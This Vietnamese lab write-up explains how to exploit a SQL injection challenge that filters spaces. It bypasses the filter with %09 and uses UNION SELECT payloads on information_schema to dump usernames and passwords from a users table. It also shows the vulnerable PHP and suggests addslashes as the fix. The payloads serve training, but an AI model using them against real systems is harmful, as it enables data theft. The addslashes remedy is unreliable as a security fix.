
**1. Khai thác sqli lv2:
------------------------

Khi thêm dấu `'` vào phía sau url: `http://vulnerable/sqli/example2.php?name=root'` thì trang web báo lỗi chứng tỏ có lỗi sqli

<img src="http://i.imgur.com/vJMvpn5.jpg">

Tiếp theo thử bypass như lv1 `http://vulnerable/sqli/example2.php?name=root' or ''='` báo lỗi :ERROR NO SPACE 

Để xem vì sao lại có thông báo đó thì ta xem source php: `http://vulnerable/sqli/example2.php?name[]=root`

<img src="http://i.imgur.com/Xsfoks1.jpg">

Vậy là ở đây khoảng trắng đã được người tạo loại bỏ, chúng ta cần thay thể khoảng trẳng bằng các kí hiệu url thay thế khác:

<img src="http://i.imgur.com/x0NBaO4.jpg">

Thử thay thể khoảng trắng thành `%01` thì không hiện lỗi `ERROR NO SPACE`

Tiếp theo tiến hành bypass thay lần lượt các kí hiệu khoảng trắng thì được `%09` xuất hiện ra đầy đủ các user:

`http://vulnerable/sqli/example2.php?name=root'%09or%09''='`

<img src="http://i.imgur.com/AJ4y9FC.jpg">

Tiếp theo xác định số cột để khai thác: `http://vulnerable/sqli/example2.php?name=root'%09union%09select%091,2,3,4,5--%09`

Sau khi xác định được 5 cột thì cho hiện thông tin mà tất cả các cột đó chứa: `http://vulnerable/sqli/example2.php?name=root'%09UNION%09SELECT%091,table_name,3,4,5%09FROM%09information_schema.tables--%09`

<img src="http://i.imgur.com/6bbHwZ1.jpg">

Như bài pentest đợt trước , ở đây ta thấy có bảng `users` sẽ chứa thông tin user để chúng ta khai thác.

`http://vulnerable/sqli/example2.php?name=root'%09UNION%09SELECT%091,table_name,column_name,4,5%09FROM%09information_schema.columns--%09`

<img src="http://i.imgur.com/76h5V4b.jpg">

Kết quả: `http://vulnerable/sqli/example2.php?name=root'%09union%09select%091,concat(id,':',name,':',age,':',groupid,':',passwd),3,4,5%09from%09users--%09`

<img src="http://i.imgur.com/woBcKAt.jpg">

Ở đây, users có 5 cột, giờ chỉ việc cho hiển thị là xong:

**2. Mô phỏng lỗi:
------------------

```sh
<?php
  if (preg_match('/ /', $_GET["name"])) {
      die("ERROR NO SPACE");   
  }
  $sql = "SELECT * FROM users where name='";
  $sql .= $_GET["name"]."'";
?>
```

**3. Fix lỗi:
-------------

Tương tự bài trước thêm: `addslashes` trước khi GET